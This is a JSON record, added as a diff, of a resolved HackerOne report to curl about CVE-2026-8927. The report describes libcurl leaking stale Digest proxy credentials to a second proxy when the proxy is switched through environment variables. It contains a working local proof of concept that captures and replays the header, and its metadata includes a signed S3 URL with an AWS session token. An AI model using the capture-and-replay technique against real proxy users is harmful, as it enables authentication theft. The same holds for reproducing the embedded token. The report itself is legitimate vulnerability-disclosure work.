@@ -1,0 +1,123 @@
+{
+  "id": 3744543,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzQ0NTQz",
+  "url": "https://hackerone.com/reports/3744543",
+  "title": "CVE-2026-8927: env-set cross-proxy Digest auth state leak",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-18T11:47:15.139Z",
+  "submitted_at": "2026-05-18T11:47:16.236Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "adyej",
+    "url": "/adyej",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-8927",
+    "CVE-2026-7168"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:24:47.684Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:16:57.532Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## AI-assisted preparation note\n\nI used AI assistance to help structure and format this report, but the technical findings, PoC, and verification results are based on local testing against curl/libcurl 8.20.0.\n\n## Summary\n\nI found a possible incomplete-fix variant of CVE-2026-7168 in libcurl 8.20.0.\n\nThe original issue involved stale Digest proxy authentication state being sent from `proxyA` to `proxyB` when the same libcurl easy handle was reused after changing proxies. In curl 8.20.0, the explicit `CURLOPT_PROXY` path appears to be fixed: changing the proxy via `CURLOPT_PROXY` clears the old proxy Digest/auth state correctly.\n\nHowever, I found that the same cleanup does not appear to happen when the effective proxy changes through environment variables such as `http_proxy` or `ALL_PROXY`.\n\nAs a result, when the same easy handle is reused:\n\n1. The first transfer uses `proxyA` from `http_proxy` and authenticates with HTTP Digest proxy authentication.\n2. The environment variable is changed so the next transfer uses `proxyB`.\n3. The same easy handle performs the second transfer.\n4. `proxyB` receives a `Proxy-Authorization: Digest` header using stale Digest state from `proxyA`.\n\nThis was reproduced against official curl/libcurl 8.20.0.\n\n## Affected version\n\nTested against official curl/libcurl 8.20.0.\n\nThe PoC confirms:\n\n```text\nLIBCURL_RUNTIME=8.20.0\nLIBCURL_HEADERS=8.20.0\n```\n\n## Impact\n\nA malicious second proxy can receive a `Proxy-Authorization: Digest` header generated from the previous proxy's Digest challenge state.\n\nIn my replay test, the header captured by `proxyB` was valid for `proxyA` and could be replayed successfully. This is the same security class as CVE-2026-7168: proxy authentication state intended for one proxy crosses a proxy boundary and is exposed to another proxy.\n\nThis can allow a malicious proxy to capture and replay Digest proxy authentication material intended for another proxy.\n\n## Technical details\n\nThe explicit proxy-change path appears to be fixed in 8.20.0.\n\nWhen an application changes the proxy using `CURLOPT_PROXY`, the previous proxy Digest/auth state is cleared. My control test confirmed:\n\n```text\nCURLOPT_PROXY proxyA -> CURLOPT_PROXY proxyB\nResult: no stale Proxy-Authorization header sent to proxyB\n```\n\nThe environment-derived proxy path behaves differently.\n\nWhen the proxy is selected from `http_proxy` or `ALL_PROXY`, changing the environment variable from `proxyA` to `proxyB` causes the second transfer to use `proxyB`, but the previous Digest proxy-auth state remains associated with the reused easy handle.\n\nObserved request received by `proxyB`:\n\n```http\nGET http://example.test/protected HTTP/1.1\nHost: example.test\nProxy-Authorization: Digest username=\"silly\", realm=\"realmA\", nonce=\"nonceA\", uri=\"/protected\", ...\n```\n\n`realmA` and `nonceA` were issued by `proxyA`, not `proxyB`.\n\n## Steps to reproduce\n\n1. Build curl/libcurl 8.20.0.\n2. Run the PoC below.\n3. The PoC starts two local HTTP proxy servers:\n   - `proxyA` issues a Digest proxy-auth challenge.\n   - `proxyB` captures the first request it receives.\n4. The client uses one reused libcurl easy handle.\n5. First transfer:\n   - `http_proxy=http://silly:person@127.0.0.1:<proxyA>`\n   - libcurl authenticates to `proxyA` using Digest.\n6. Second transfer:\n   - `http_proxy=http://silly:person@127.0.0.1:<proxyB>`\n   - same easy handle reused.\n7. `proxyB` receives a stale `Proxy-Authorization: Digest` header using `proxyA`'s realm/nonce.\n\n## Expected result\n\nWhen the effective proxy changes from `proxyA` to `proxyB`, libcurl should clear proxy Digest/auth state before the second transfer, regardless of whether the proxy was changed via `CURLOPT_PROXY` or selected from environment variables.\n\n`proxyB` should not receive a `Proxy-Authorization: Digest` header based on `proxyA`'s challenge.\n\n## Actual result\n\n`proxyB` receives:\n\n```http\nProxy-Authorization: Digest username=\"silly\", realm=\"realmA\", nonce=\"nonceA\", ...\n```\n\nThe captured Digest response was replayed to `proxyA` in my full PoC and accepted.\n\nPoC summary:\n\n```json\n{\n  \"runtime\": \"8.20.0\",\n  \"headers\": \"8.20.0\",\n  \"B_received_proxy_authorization\": true,\n  \"B_digest_valid_for_proxyA\": true,\n  \"replay_status\": \"HTTP/1.1 200 OK\"\n}\n```\n\n## Minimal PoC\n\nThe following local-only PoC demonstrates the stale `Proxy-Authorization: Digest` header being sent to `proxyB`.\n\n```python\n#!/usr/bin/env python3\nimport os\nimport re\nimport socketserver\nimport subprocess\nimport tempfile\nimport threading\nfrom pathlib import Path\n\nREALM = \"realmA\"\nNONCE = \"nonceA\"\n\ncaptured_by_b = {\n    \"raw\": \"\",\n    \"proxy_authorization\": \"\"\n}\n\nclass ProxyA(socketserver.BaseRequestHandler):\n    def handle(self):\n        # First request: challenge with Digest proxy auth\n        self.request.recv(65535).decode(\"iso-8859-1\", errors=\"replace\")\n\n        resp407 = (\n            \"HTTP/1.1 407 Proxy Authentication Required\\r\\n\"\n            f'Proxy-Authenticate: Digest realm=\"{REALM}\", nonce=\"{NONCE}\", qop=\"auth\", algorithm=MD5\\r\\n'\n            \"Content-Length: 0\\r\\n\"\n            \"Connection: keep-alive\\r\\n\"\n            \"\\r\\n\"\n        )\n        self.request.sendall(resp407.encode(\"ascii\"))\n\n        # Second request: libcurl should authenticate to proxyA\n        self.request.recv(65535).decode(\"iso-8859-1\", errors=\"replace\")\n\n        resp200 = (\n            \"HTTP/1.1 200 OK\\r\\n\"\n            \"Content-Length: 2\\r\\n\"\n            \"Connection: close\\r\\n\"\n            \"\\r\\n\"\n            \"OK\"\n        )\n        self.request.sendall(resp200.encode(\"ascii\"))\n\nclass ProxyB(socketserver.BaseRequestHandler):\n    def handle(self):\n        req = self.request.recv(65535).decode(\"iso-8859-1\", errors=\"replace\")\n        captured_by_b[\"raw\"] = req\n\n        m = re.search(r\"^Proxy-Authorization:\\s*(.*)$\", req, re.I | re.M)\n        if m:\n            captured_by_b[\"proxy_authorization\"] = m.group(1).strip()\n\n        resp200 = (\n            \"HTTP/1.1 200 OK\\r\\n\"\n            \"Content-Length: 2\\r\\n\"\n            \"Connection: close\\r\\n\"\n            \"\\r\\n\"\n            \"OK\"\n        )\n        self.request.sendall(resp200.encode(\"ascii\"))\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    allow_reuse_address = True\n    daemon_threads = True\n\ndef start_server(handler):\n    srv = ThreadedTCPServer((\"127.0.0.1\", 0), handler)\n    port = srv.server_address[1]\n    t = threading.Thread(target=srv.serve_forever, daemon=True)\n    t.start()\n    return srv, port\n\ndef build_client(tmpdir: Path):\n    c_code = r'''\n#include <stdio.h>\n#include <stdlib.h>\n#include <curl/curl.h>\n\nstatic size_t sink(char *ptr, size_t size, size_t nmemb, void *userdata) {\n  (void)ptr;\n  (void)userdata;\n  return size * nmemb;\n}\n\nint main(int argc, char **argv) {\n  if(argc != 3) {\n    fprintf(stderr, \"usage: %s <proxyA_port> <proxyB_port>\\n\", argv[0]);\n    return 2;\n  }\n\n  const char *pa = argv[1];\n  const char *pb = argv[2];\n\n  curl_version_info_data *vi = curl_version_info(CURLVERSION_NOW);\n  printf(\"LIBCURL_RUNTIME=%s\\n\", vi->version);\n  printf(\"LIBCURL_HEADERS=%s\\n\", LIBCURL_VERSION);\n\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n\n  CURL *h = curl_easy_init();\n  if(!h)\n    return 1;\n\n  curl_easy_setopt(h, CURLOPT_URL, \"http://example.test/protected\");\n  curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, sink);\n  curl_easy_setopt(h, CURLOPT_PROXYAUTH, CURLAUTH_DIGEST);\n  curl_easy_setopt(h, CURLOPT_VERBOSE, 1L);\n\n  char envA[256];\n  char envB[256];\n\n  snprintf(envA, sizeof(envA), \"http://silly:person@127.0.0.1:%s\", pa);\n  snprintf(envB, sizeof(envB), \"http://silly:person@127.0.0.1:%s\", pb);\n\n  /*\n   * First request:\n   * No CURLOPT_PROXY is set. Proxy is selected from http_proxy.\n   */\n  setenv(\"http_proxy\", envA, 1);\n\n  CURLcode r1 = curl_easy_perform(h);\n  fprintf(stderr, \"first perform: %d\\n\", (int)r1);\n\n  /*\n   * Second request:\n   * Same easy handle. Effective proxy changes through http_proxy.\n   */\n  setenv(\"http_proxy\", envB, 1);\n\n  CURLcode r2 = curl_easy_perform(h);\n  fprintf(stderr, \"second perform: %d\\n\", (int)r2);\n\n  curl_easy_cleanup(h);\n  curl_global_cleanup();\n\n  return 0;\n}\n'''\n    src = tmpdir / \"env_proxy_digest_poc.c\"\n    exe = tmpdir / \"env_proxy_digest_poc\"\n    src.write_text(c_code)\n\n    subprocess.check_call([\n        \"gcc\",\n        str(src),\n        \"-o\",\n        str(exe),\n        \"-lcurl\"\n    ])\n\n    return exe\n\ndef main():\n    proxy_a, port_a = start_server(ProxyA)\n    proxy_b, port_b = start_server(ProxyB)\n\n    with tempfile.TemporaryDirectory() as d:\n        tmpdir = Path(d)\n        exe = build_client(tmpdir)\n\n        env = os.environ.copy()\n        env.pop(\"http_proxy\", None)\n        env.pop(\"HTTP_PROXY\", None)\n        env.pop(\"all_proxy\", None)\n        env.pop(\"ALL_PROXY\", None)\n        env.pop(\"no_proxy\", None)\n        env.pop(\"NO_PROXY\", None)\n\n        p = subprocess.run(\n            [str(exe), str(port_a), str(port_b)],\n            env=env,\n            text=True,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            timeout=10\n        )\n\n        print(\"=== client stdout ===\")\n        print(p.stdout)\n        print(\"=== client stderr ===\")\n        print(p.stderr)\n\n        print(\"=== request captured by proxyB ===\")\n        print(captured_by_b[\"raw\"])\n\n        has_stale = (\n            \"Proxy-Authorization: Digest\" in captured_by_b[\"raw\"]\n            and f'realm=\"{REALM}\"' in captured_by_b[\"raw\"]\n            and f'nonce=\"{NONCE}\"' in captured_by_b[\"raw\"]\n        )\n\n        print(\"B_RECEIVED_PROXY_AUTHORIZATION=\", bool(captured_by_b[\"proxy_authorization\"]))\n        print(\"STALE_DIGEST_FROM_PROXY_A_SENT_TO_PROXY_B=\", has_stale)\n\n    proxy_a.shutdown()\n    proxy_b.shutdown()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nExample output on official curl/libcurl 8.20.0:\n\n```text\nLIBCURL_RUNTIME=8.20.0\nLIBCURL_HEADERS=8.20.0\n\nB_RECEIVED_PROXY_AUTHORIZATION= True\nSTALE_DIGEST_FROM_PROXY_A_SENT_TO_PROXY_B= True\n```\n\nThe request captured by `proxyB` contains:\n\n```http\nProxy-Authorization: Digest username=\"silly\", realm=\"realmA\", nonce=\"nonceA\", ...\n```\n\n## Controls tested\n\nThe following controls were tested to reduce false positives:\n\n| Case | Result |\n|---|---|\n| Same easy handle + env `http_proxy` proxyA -> proxyB | Vulnerable: stale Digest sent |\n| Same easy handle + env `ALL_PROXY` proxyA -> proxyB | Vulnerable: stale Digest sent |\n| Explicit `CURLOPT_PROXY` proxyA -> proxyB | Not vulnerable |\n| New easy handle for second request | Not vulnerable |\n| `curl_easy_reset()` before second request | Not vulnerable |\n| `CURLOPT_PROXY = NULL` before second request | Not vulnerable |\n| proxyB has no credentials | Not vulnerable in my test |\n| proxyB has credentials/user-only credentials | Vulnerable: stale Digest state sent |\n\n## Suggested fix direction\n\nApply the same proxy-auth cleanup used for explicit `CURLOPT_PROXY` changes when the effective proxy changes due to environment variable resolution.\n\nWhen the resolved proxy changes between transfers on a reused easy handle, libcurl should clear/reset the previous proxy-auth state before generating a new `Proxy-Authorization` header, including at least:\n\n```text\ndata->state.proxydigest\ndata->state.authproxy\n```\n\nor the equivalent proxy-auth state.\n\n## Note\n\nThis report is not claiming that the explicit `CURLOPT_PROXY` fix is missing. I verified that the explicit `CURLOPT_PROXY` path is fixed in 8.20.0.\n\nThe issue is that an equivalent proxy-boundary change through environment variables such as `http_proxy` or `ALL_PROXY` still appears to leave stale Digest proxy-auth state on the reused easy handle.\n\n## Impact\n\nA malicious second proxy can receive a Proxy-Authorization: Digest header generated from a previous proxy’s Digest challenge state. In the PoC, this captured header was valid for the original proxy and could be replayed successfully, allowing authentication material intended for proxyA to cross the proxy boundary and be exposed to proxyB. This may allow capture/replay of proxy authentication and unauthorized use of the victim’s authenticated proxy session.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5941580,
+      "file_name": "curl820_proxy_env_replay_confirm_(1).zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ngdydlsxfkfr6q1fcjumqnw85dgm?response-content-disposition=attachment%3B%20filename%3D%22curl820_proxy_env_replay_confirm_%25281%2529.zip%22%3B%20filename%2A%3DUTF-8%27%27curl820_proxy_env_replay_confirm_%25281%2529.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV6NOQUFO%2F20260624%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260624T090617Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGkaCXVzLXdlc3QtMiJGMEQCIHBe7v2p9JxPToFtloiR%2F2LbsJDj1sdH8vf%2FdWiRsf%2BxAiA5sn6F%2FmXO1vhKkpJFZaHuPxYAdUetf1PYbZBGl1j5uyqxBQgyEAMaDDAxMzYxOTI3NDg0OSIMloR9O2H44SilakP6Ko4FhlJ4x9B9Eb4kw3qm8%2BBDknhDzbzQiglqd3HUUTRhzxFhNpO5PA0WnDA7fDPgBSW31ook5CNPXarXlFJdY%2Fr1UJTsDZpmmNHtrIDY5zCaWOSGBv0NbXYnYtpyUQD57fN9J%2BStfw3Ig9kyiHfmwwsvWpqWO1jghym3P7ifazJ088%2BApz3%2Fpyp76uOKuvJBitAJUkEF1nCin59%2BMkjWLCzWAVZ0rbvNgpFZKt0stANYvaKJglOLVG%2B3ZlPsxMzbmxyTZvM5fVZy%2Fahxyd1zcZTRWqXeetbORpnYgMyWssuvTinP%2FfaY65qW5Y3CKpydXhopa7YAeJLuxE%2Bk4rQa%2F3e88wYhb5vC5ui%2B1m5%2F%2BF356MO2%2BersYLVUYYzeMSI43WOi2YW804ki%2FqotpuYvF7gW%2BEHQWJlU1FoyBvn%2BCBzO3IFqIW3hMgL%2FtkmfHl2kpiyI6xcgCY6eSAx%2BG%2FFFDNcdHaeYOXuaj4cN%2FLgaabKXMetADkW7ULcv0qEcTRGoWQxm8ogogLTOBes8XC%2BOaPQDjtEN8GqBxY%2BD47eazPfks%2BGnMoLR4UEyk1FuGVQ6GswVE9XcGXXTBk6RgyhibRaLc80tumlXlT93SVhGUc6xH4S43W3SaTlH8SNZI7khE7h0AWIxFBnJ3dgnWnV8r7z1a44N0ee09Lrond3uqmID4ymVwAH8gy7PDf7zGd27QhE8kZfobXXOwBlM7aevaM79hojASbJIqjyoIf86KvaLi6CzfwigbyLqSZKf407hYHJG%2B639phgcLWl9fq5yLFpQRUK7VraXaTFP%2FLSW1sxw4hVVW39qu3Ptex1niJ5kSKMC0m862ddsmQEKzj3K0zWaRQdUCnOkvRLXqxRywPRpMP2v7tEGOrIBGMuxSawlIBa%2BCCBrm5R4M%2BGT6RMZdnrPJdYCw%2FcwLbStUWnCWHTqUjneJpDevxAZgyK8DFx%2B3tNcLc0xd24u%2BuPzWQQsRg7Mv6wXl1FZK%2F7nX6gOb43c%2Few5yuDZicwBnolXcXwp1X%2B52irBjsISW9Gq3QhcOXjdGRuG%2BuLgg%2BwUJImvckI3loTRkt9%2B8fWtnxnuswUcLJ29%2Fm0a6uX20W%2FpCShRcAUYj04dn7WJ4o0zow%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=19f9c21a8a1bb3f5a547f951f048c3e400288396da1e9c3eaf56aba3f0363c41",
+      "file_size": 5286,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
